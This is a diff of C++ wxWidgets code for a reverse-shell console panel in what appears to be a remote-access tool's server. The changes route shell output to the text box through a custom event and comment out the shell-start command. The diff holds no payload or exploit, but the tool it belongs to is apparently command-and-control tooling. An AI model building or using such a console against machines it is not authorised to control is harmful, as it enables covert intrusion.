@@ -4,14 +4,18 @@
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
+//Custom event
+wxDEFINE_EVENT(ADD_SHELL_OUTPUT, wxCommandEvent);
+
 wxBEGIN_EVENT_TABLE(panelReverseShell, wxPanel)
     EVT_BUTTON(wxID_ANY, panelReverseShell::OnButton)
 wxEND_EVENT_TABLE()
 
+
 //Reverse Shell
 panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck) :
     wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
-    
+
     this->sckCliente = sck;
     
     this->txtConsole = new wxTextCtrl(this, EnumIDS::ID_Panel_Reverse_Shell_TxtConsole, "Reverse Shell v0.1\n", wxDefaultPosition, wxDefaultSize, wxTE_MULTILINE | wxTE_RICH);
@@ -33,7 +37,8 @@ panelReverseShell::panelReverseShell(wxWindow* pParent, SOCKET sck) :
     this->SetSizer(main_sizer);
 
     Bind(wxEVT_CHAR_HOOK, &panelReverseShell::OnHook, this);
-    p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
+    Bind(ADD_SHELL_OUTPUT, &panelReverseShell::OnAgregarTexto, this);
+    //p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
 }
 
 void panelReverseShell::OnHook(wxKeyEvent& event) {
@@ -99,14 +104,21 @@ void panelReverseShell::OnHook(wxKeyEvent& event) {
     }
 }
 
-void panelReverseShell::EscribirSalida(const char*& pBuffer) {
+void panelReverseShell::OnAgregarTexto(wxCommandEvent& event) {
+    if (this->txtConsole) {
+        this->txtConsole->AppendText(event.GetString());
+        this->p_uliUltimo = this->txtConsole->GetLastPosition();
+    }
+}
+
+void panelReverseShell::EscribirSalida(const char* pBuffer) {
     wxString strData(pBuffer);
-    wxTheApp->CallAfter([this, strData]() {
-        if (this->txtConsole) {
-            this->txtConsole->AppendText(strData);
-            this->p_uliUltimo = this->txtConsole->GetLastPosition();
-        }
-        });
+    
+    wxCommandEvent evento(ADD_SHELL_OUTPUT, GetId());
+
+    evento.SetString(pBuffer);
+
+    wxPostEvent(this, evento);
 }
 
 void panelReverseShell::OnButton(wxCommandEvent& event) {
@@ -130,7 +142,4 @@ void panelReverseShell::OnButton(wxCommandEvent& event) {
 
     p_Servidor->cChunkSend(this->sckCliente, strCommand.c_str(), strCommand.size(), 0, false, iComando);
 
-    //p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, 1, 0, false, EnumComandos::Reverse_Shell_Start);
-
-    //p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
 }
